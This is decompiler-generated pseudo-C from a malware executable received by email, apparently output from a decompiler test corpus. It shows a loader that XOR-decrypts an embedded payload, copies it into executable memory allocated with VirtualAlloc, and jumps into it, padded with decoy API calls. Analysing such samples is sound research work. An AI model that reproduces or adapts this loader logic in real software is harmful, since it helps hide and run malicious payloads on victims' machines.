// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0541/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

word32 fn1310E000(Eq_89 * dwArg04, word32 dwArg08, word32 dwArg0C, word32 dwArg10, word32 dwArg14, word32 dwArg18)
{
	*dwArg10 = dwArg0C;
	word16 wLoc10_104 = (word16) (SEQ(0x00000000, dwArg14) % 0x00000005);
	Eq_15 * dwArg08_28 = dwArg08 + dwArg14;
	dwArg0C = dwArg0C - 0x00000001;
	while (dwArg0C != 0x00000000)
	{
		dwArg04->b0000 = (byte) ((int32) dwArg08_28->b0000 ^ (word32) ((int32) wLoc10_104)[dwArg18]);
		word16 cx_83 = wLoc10_104 + 0x0001;
		wLoc10_104 = cx_83;
		if ((int32) cx_83 == 0x00000005)
			wLoc10_104 = 0x0000;
		dwArg04 = dwArg04 + 1;
		dwArg08_28 = dwArg08_28 + 1;
		dwArg0C = dwArg0C - 0x00000001;
	}
	return dwArg0C;
}

word32 fn1310E09B()
{
	SetErrorMode(0x5C000000);
	ADVAPI32.dll!WmiReceiveNotificationsA();
	GetStartupInfoA(fp + 0xFFFFFD6C);
	ADVAPI32.dll!WmiSetSingleInstanceW();
	Eq_63 * eax_36 = SafeArrayGetUBound(null, 0x0006C000, (LONG *) 0x00012C00);
	if (eax_36 != (Eq_63 *) 0xFC110199 && eax_36 + 0x80010332 == eax_36 + 0xFFFD0199)
	{
		word32 ebx_303 = eax_36->dw9309E6A9;
		fn1310E000(fp + 0xFFFFFDC4, fp + 0xFFFFFDC4, 0x00000004, fp - 0x00000010, 0x00000000, fp + 0xFFFFFDCC);
		word32 edi_328 = eax_36->dw9309E6AD;
		fn1310E000(fp + 0xFFFFFDA8, fp + 0xFFFFFDA4, 0x00000004, fp - 0x00000010, 0x00000004, fp + 0xFFFFFDCC);
		ui32 edi_351 = eax_36->dw9309E6B1;
		fn1310E000(fp - 0x00000014, fp - 0x0000001C, 0x00000004, fp - 0x00000010, 0x00000008, fp + 0xFFFFFDCC);
		Eq_138 eax_378 = GetModuleHandleA(0x00000000);
		word32 eax_386 = eax_36->dw9309E6B5;
		fn1310E000(fp - 0x0000001C, fp - 0x00000028, 0x00000004, fp - 0x00000010, 0x0000000C, fp + 0xFFFFFDCC);
		dwLoc0248 = eax_36->dw9309E6B9;
		fn1310E000(fp + 0xFFFFFDB8, fp + 0xFFFFFDA8, 0x00000004, fp - 0x00000010, 0x00000010, fp + 0xFFFFFDCC);
		word32 eax_449 = edi_351 * 0x00000008 + 0x0000000C;
		dwLoc0258 = edi_328;
		dwLoc14 = edi_351;
		dwLoc20 = eax_378;
		dwLoc024C = 0x00000014;
		dwLoc24 = eax_36 + 0x9309E6BD;
		dwLoc2C = eax_449;
		dwLoc0260 = VirtualAlloc(0x00000000, eax_449 + edi_328 + ebx_303, 0x00003000, 0x00000040);
		dwLoc0C = eax_386 + eax_378 + eax_449;
		dwLoc0264 = eax_449;
		dwLoc08 = 0x00000000;
		dwLoc18 = 0x00000000;
		goto l1310E32A;
	}
l1310E32A:
	while (0x00000001 != 0x00000000)
	{
		if (dwLoc0264 == dwLoc0248)
		{
			ui32 edx_221 = dwLoc08 + 0x00000001;
			dwLoc08 = edx_221;
			if (edx_221 == dwLoc14)
				goto l1310E45A;
			word32 edx_227 = dwLoc24->dw0000;
			fn1310E000(fp - 0x0000001C, fp - 0x0000001C - dwLoc024C, 0x00000004, fp - 0x00000010, dwLoc024C, fp + 0xFFFFFDCC);
			Eq_253 * esi_257 = &dwLoc24->t0004;
			word32 ebx_254 = dwLoc024C + 0x00000004;
			dwLoc0248 = esi_257->dw0000;
			fn1310E000(fp + 0xFFFFFDB8, fp + 0xFFFFFDB8 - ebx_254, 0x00000004, fp - 0x00000010, ebx_254, fp + 0xFFFFFDCC);
			dwLoc024C = ebx_254 + 0x00000004;
			dwLoc24 = esi_257 + 0x00000004;
			dwLoc0264 = 0x00000000;
			dwLoc0C = edx_227 + dwLoc20;
			goto l1310E415;
		}
l1310E415:
		dwLoc0260->b0000 = dwLoc0C->b0000;
		dwLoc0C = dwLoc0C + 1;
		dwLoc18 = dwLoc18 + 0x00000001;
		dwLoc0264 = dwLoc0264 + 0x00000001;
	}
l1310E45A:
	word32 eax_147 = fn1310E000(dwLoc0260, dwLoc0260 - dwLoc2C, dwLoc0258, fp + 0xFFFFFDC8, dwLoc2C, fp + 0xFFFFFDCC);
	(dwLoc0260 + 0x00000F50)();
	return eax_147;
}

void fn1310E4E5(Eq_281 * fs)
{
	word32 * eax_14 = fs->ptr0000;
	fs->ptr0000 = fp - 0x00000014;
	__set_app_type();
	__p__fmode();
	*eax_14 = 0x00000000;
	__p__commode();
	*eax_14 = 0x00000000;
	word32 eax_51 = Mem49[_adjust_fdiv:word32];
	fn1310E63E();
	word32 esp_193 = fp + 0xFFFFFF68;
	if (eax_51 == 0x00000000)
	{
		__setusermatherr();
		esp_193 = fp + 0xFFFFFF64;
	}
	fn1310E629();
	Eq_318 * esp_59 = esp_193 - 0x00000004;
	esp_59->dw0000 = fp - 0x00000080;
	esp_59->dw0000 = fp - 0x00000080;
	_initterm();
	esp_59->tFFFFFFF4 = fp - 0x00000070;
	esp_59->dwFFFFFFF0 = eax_51;
	esp_59->dwFFFFFFEC = fp - 0x00000068;
	esp_59->dwFFFFFFE8 = fp - 0x00000074;
	esp_59->dwFFFFFFE4 = fp - 0x00000064;
	__getmainargs();
	esp_59->dwFFFFFFDC = fp - 0x00000080;
	esp_59->dwFFFFFFD8 = fp - 0x00000080;
	_initterm();
	word32 esi_161 = Mem85[_acmdln:word32];
	if (esi_161->b0000 == 0x22)
	{
l1310E597:
		do
		{
			esi_161 = esi_161 + 1;
			bcu8 al_171 = esi_161->b0000;
		} while (al_171 == 0x00 || al_171 == 0x22);
		if (esi_161->b0000 == 0x22)
		{
l1310E5AA:
			esi_161 = esi_161 + 1;
l1310E5AE:
			bcu8 al_98 = esi_161->b0000;
			if (al_98 != 0x00 && al_98 <=u 0x20)
				goto l1310E5AA;
		}
		else
			goto l1310E5AE;
	}
	else
		while (esi_161->b0000 >u 0x20)
			esi_161 = esi_161 + 1;
	Eq_57 eax_113;
	esp_59->tFFFFFFF4 = fp - 0x00000060;
	GetStartupInfoA(esp_59->tFFFFFFF4);
	word32 esp_109 = &esp_59->tFFFFFFF4;
	if (0x00 != 0x00)
		eax_113 = (word32) wLoc30;
	else
	{
		esp_59->tFFFFFFF4.u0 = 0x0000000A;
		eax_113 = esp_59->tFFFFFFF4;
		esp_109 = &esp_59->tFFFFFFF4;
	}
	Eq_439 * esp_115 = esp_109 - 0x00000004;
	esp_115->t0000 = eax_113;
	Mem118[esp_115 - 0x00000004:word32] = esi_161;
	esp_115->t0000.u0 = 0x00000000;
	esp_115->t0000.u0 = 0x00000000;
	Mem126[esp_115 - 0x0000000C:word32] = GetModuleHandleA(esp_115->t0000);
	esp_115->dw0016 = fn1310E09B();
	exit(esp_115->dw0016);
	word32 ecx_137 = **dwLoc18;
	esp_115->ptr0012 = dwLoc18;
	esp_115->dw000E = ecx_137;
	_XcptFilter();
	return;
}

void fn1310E629()
{
	_controlfp();
	return;
}

void fn1310E63E()
{
	return;
}

